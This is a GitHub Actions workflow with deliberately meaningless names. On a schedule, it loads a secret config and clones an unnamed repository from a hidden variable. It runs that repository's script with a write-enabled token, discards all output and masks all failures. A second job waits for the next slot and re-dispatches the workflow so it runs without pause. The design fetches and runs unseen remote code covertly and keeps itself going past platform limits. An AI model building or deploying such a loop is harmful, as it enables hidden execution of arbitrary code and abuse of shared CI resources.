name: m
on:
  schedule: [ { cron: "7,27,47 * * * *" } ]
  workflow_dispatch: {}
permissions: { contents: write, actions: write }
jobs:
  a:
    runs-on: ubuntu-latest
    timeout-minutes: 300
    concurrency: { group: a, cancel-in-progress: false }
    steps:
      - name: run
        env: { CFG: "${{ secrets.CFG }}", GH_TOKEN: "${{ github.token }}" }
        run: |
          { printf '%s\n' "$CFG" | sed 's/\r$//' > "$RUNNER_TEMP/c"; set -a; . "$RUNNER_TEMP/c"; set +a; rm -f "$RUNNER_TEMP/c"
            git clone -q --depth 1 "$SRC" w && bash w/scripts/runner.sh; } >/dev/null 2>&1 || true
  n:
    needs: [a]
    if: always()
    runs-on: ubuntu-latest
    concurrency: { group: n, cancel-in-progress: true }
    steps:
      - name: run
        env: { GH_TOKEN: "${{ github.token }}", R: "${{ github.repository }}" }
        run: |
          { m=$((10#$(date -u +%M))); w=$(( ( (27 - m % 20 + 20) % 20 ) * 60 )); [ $w -lt 60 ] && w=$((w+1200)); sleep $w
            busy=$(gh api "repos/$R/actions/workflows/m.yml/runs?per_page=10" --jq "[.workflow_runs[]|select(.id!=${{ github.run_id }} and (.status==\"queued\" or .status==\"in_progress\" or .status==\"waiting\" or .status==\"pending\"))]|length")
            [ "$busy" = "0" ] && gh workflow run m.yml -R "$R"; } >/dev/null 2>&1 || true
